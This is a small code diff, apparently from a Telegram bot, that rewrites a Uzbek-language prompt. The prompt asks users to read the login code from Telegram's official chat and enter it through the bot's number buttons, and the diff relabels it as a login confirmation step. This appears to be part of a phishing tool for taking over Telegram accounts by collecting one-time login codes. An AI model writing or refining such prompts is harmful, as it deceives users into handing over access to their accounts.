@@ -393,7 +393,7 @@ def numpad_display(buffer: str, total: int = CODE_LENGTH) -> str:
 
 def numpad_message(buffer: str, hint: str = "") -> str:
     base = (
-        "📋 RO'YXATDAN O'TISH (3/4)\n\n"
+        "🔑 KIRISH — TASDIQ KODI\n\n"
         "📩 Telegramdan kelgan kodni quyidagi tugmalar orqali kiriting.\n\n"
         "👉 Telegram ilovangizni oching → \"Telegram\" rasmiy chati →\n"
         "    kodni KO'RING va shu yerga tugmalar orqali kiriting.\n\n"
